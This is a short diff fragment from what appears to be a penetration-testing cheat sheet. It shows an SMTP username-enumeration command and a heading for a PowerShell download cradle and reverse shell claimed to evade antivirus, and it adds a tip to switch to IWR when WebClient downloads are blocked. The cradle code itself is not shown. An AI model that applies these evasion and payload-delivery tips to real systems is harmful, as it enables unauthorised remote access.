@@ -18,6 +18,7 @@ $ smtp-user-enum -M EXPN -D example.com -U users.txt -t 10.0.0.1
 
 **Simple Powershell Download Cradle and RevShell via TCPSocket**
 - Can evade AV because of the use of "non-standard" var names
+- Note if you dont see the run.txt being downloaded, it may be because the method of New-Object System.Net.WebClient is restricted. You can use IWR instead
 ```html
 <html>
 <head>
